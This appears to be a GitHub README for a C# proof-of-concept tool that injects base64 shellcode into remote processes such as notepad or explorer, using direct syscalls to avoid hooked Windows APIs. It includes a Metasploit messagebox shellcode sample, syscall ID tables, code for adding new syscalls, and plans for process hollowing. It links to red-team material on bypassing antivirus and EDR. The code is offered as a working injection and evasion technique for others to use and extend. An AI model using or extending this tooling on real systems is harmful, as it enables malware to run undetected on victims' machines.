# directInjectorPOC

Small program written in C#, compatible with .NET >= v3.5 . Only x64. Works from ws 2008 up to the latest windows 10 update. 

Created as a way to learn more about direct syscalls and their implementation in C#. 

The program uses direct syscalls to perform the shellcode allocating/injection and the remote thread creation. The only imports are GetSystemInfo, RtlGetVersion and VirtualProtectEx.

The shellcode can be easily generated using tools like donut (https://github.com/TheWover/donut/)

### Usage: 

By default the program injects into "notepad" using the ALLOCWRITE write method. This can be easily modified by changing line 18 
```
Inject("notepad", osV, ALLOCWRITE);
```
can be changed to 
```
Inject("explorer", osV, OPENSEC);
```
to inject the shellcode into explorer.exe using the NtMapViewOfSection method. 

The shellcode must be in base64 and assigned to the "s" variable on line 91
```
//msf messagebox x64
string s = @"/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYD5Ii1IYPkiLUiA+SItyUD5ID7dKSk0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVE+SItSID6LQjxIAdA+i4CIAAAASIXAdG9IAdBQPotIGD5Ei0AgSQHQ41xI/8k+QYs0iEgB1k0xyUgxwKxBwckNQQHBOOB18T5MA0wkCEU50XXWWD5Ei0AkSQHQZj5BiwxIPkSLQBxJAdA+QYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVo+SIsS6Un///9dScfBAAAAAD5IjZX+AAAAPkyNhQMBAABIMclBukWDVgf/1UgxyUG68LWiVv/VZ2F0bwBNZXNzYWdlQm94AA==";
```

### Dev:

Take a look at syscalls.cs. To create a new syscall:
- Add the syscall ID to each windows version inside the sysDic dictionary.  
- Create its function delegate inside the Delegates struct
- Create a function thar runs GetDelegateForFunctionPointer and invokes the delegate functions (you can just copy paste any of the current ones and change them a little bit to adjust your needs) 
- If needed, create the required structs inside nativeStructs.cs

For example, if we would like to implement NtClose we can do the following:
```
...
            { "win10-1507", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB3},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 },
                    { "close", 0x0F }
                }
            },
...
```
```
public struct Delegates{
...
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtClose(IntPtr handler);
...
```
```
        public static NTSTATUS NtClose(IntPtr handle, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["close"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtClose myAssemblyFunction = (Delegates.NtClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtClose));

                    return (NTSTATUS)myAssemblyFunction(handle);
                }
            }
        }
```

##### ToDo:

  - Implement more ways to write our shellcode in a remote process (process hollowing, dll hollowing, etc)
  - New execution methods (steal them from pinjectra :) )
  - Try to avoid the use of VirtualProtectEx when allocating our shellcode
  - Try catch everything just in case

  
##### Links of interest:

  - https://ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection
  - https://ired.team/offensive-security/code-injection-process-injection/process-injection
  - https://github.com/TheWover/donut/
  - https://github.com/b4rtik/SharpMiniDump/
  - https://github.com/outflanknl/Dumpert (tool)  https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/ (blog)


